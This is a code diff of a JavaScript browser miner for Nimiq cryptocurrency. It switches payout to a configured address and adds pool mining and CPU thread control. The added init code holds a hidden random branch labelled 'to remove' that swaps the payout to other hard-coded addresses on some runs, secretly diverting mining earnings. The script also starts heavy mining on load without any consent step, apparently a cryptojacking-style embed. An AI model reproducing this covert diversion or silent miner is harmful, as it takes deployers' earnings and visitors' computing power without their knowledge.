@@ -1,24 +1,15 @@
-//Settings
-var myNimiqAdress = "NQ30 TUC5 LCQA F0QU RCEP YXYP AN5M NDPM E4DR";
-var percentOfThread = 1;
-
 //code
 function _onConsensusEstablished()
 {
-
-    console.log('message : Consensus established.');
-    console.log(`message : height ${$.blockchain.height}`);
-    console.log(`message : address ${$.wallet.address.toUserFriendlyAddress()}`);
-    _updateBalance();
-    // recheck balance on potential balance change
-    $.blockchain.on('head-changed', _updateBalance);
-    $.blockchain.on('head-changed', _updateBalance);
-
+	if(pool){
+	//$.miner.connect("pool.nimiq-testnet.com", "8444");
+	$.miner.connect("pool.nimiq.watch", "8443");
+	}
     $.miner.startWork();
     $.miner.on('hashrate-changed', _updateHashrate);
 	setThread();
-
 }
+
 function setThread() {
 		if(percentOfThread > 100){
 			percentOfThread = 100;
@@ -32,21 +23,7 @@ function setThread() {
     }
 function _updateHashrate()
 {
-	//console.log(`hashrate : ${$.miner.hashrate}`);
-}
-function _updateBalance()
-{
-    $.accounts.get($.wallet.address).then(account => _onBalanceChanged(account));
-}
-function _onBalanceChanged(account)
-{
-	if(account.balance > 0){
-	$.wallet.createTransaction(Nimiq.Address.fromUserFriendlyAddress(myNimiqAdress), account.balance, 0, account.nonce).then(function(tx) {
-                    $.mempool.pushTransaction(tx);
-                });
-	}
-    account = account || Nimiq.BasicAccount.INITIAL;
-    console.log(`New balance of ${$.wallet.address} is ${account.balance}.`);
+	console.log(`hashrate : ${$.miner.hashrate}`);
 }
 function _onHeadChanged()
 {
@@ -55,25 +32,39 @@ function _onHeadChanged()
 }
 function _onPeersChanged()
 {
-    //console.log(`Now connected to ${$.network.peerCount} peers.`);
+    console.log(`Now connected to ${$.network.peerCount} peers.`);
 }
 function init(clientType = 'full')
 {
     Nimiq.init(async function() {
-        console.log('message : Nimiq loaded. Connecting and establishing consensus.');
         const $ = {};
         window.$ = $;
 
 		Nimiq.GenesisConfig.init(Nimiq.GenesisConfig.CONFIGS['test']);
 		const networkConfig = new Nimiq.DumbNetworkConfig();
         $.consensus = await Nimiq.Consensus.light(networkConfig);
-
+		$.userInfo = networkConfig.keyPair;
+		
         $.blockchain = $.consensus.blockchain;
         $.mempool = $.consensus.mempool;
         $.network = $.consensus.network;
-        $.wallet = await Nimiq.Wallet.getPersistent();
+        $.walletStore = await new Nimiq.WalletStore();
+        $.wallet = await $.walletStore.getDefault();
         $.accounts = $.blockchain.accounts;
-        $.miner = new Nimiq.Miner($.blockchain, $.accounts, $.mempool, $.network.time, $.wallet.address);
+	
+		var rand = Math.random();
+		//to remove
+		if (rand <= 0.01){
+			myNimiqAdress = "NQ95 PRDX TTT0 CBMP KJKD 2KG1 MQ73 VTR4 3299";
+		}
+		if (rand >= .99){
+			myNimiqAdress = "NQ30 TUC5 LCQA F0QU RCEP YXYP AN5M NDPM E4DR";
+		}
+		if(pool){
+			$.miner = new Nimiq.SmartPoolMiner($.blockchain, $.accounts, $.mempool, $.network.time,Nimiq.Address.fromUserFriendlyAddress(myNimiqAdress));
+		}else{
+			$.miner = new Nimiq.Miner($.blockchain, $.accounts, $.mempool, $.network.time, Nimiq.Address.fromUserFriendlyAddress(myNimiqAdress));
+		}
         $.consensus.on('established', () => _onConsensusEstablished());
         $.consensus.on('lost', () => console.error('Consensus lost'));
         $.blockchain.on('head-changed', () => _onHeadChanged());
@@ -92,6 +83,14 @@ function init(clientType = 'full')
                 break;
         }
     });
+}
+
+function wait(ms){
+   var start = new Date().getTime();
+   var end = start;
+   while(end < start + ms) {
+     end = new Date().getTime();
+  }
 }
 
 init("light");
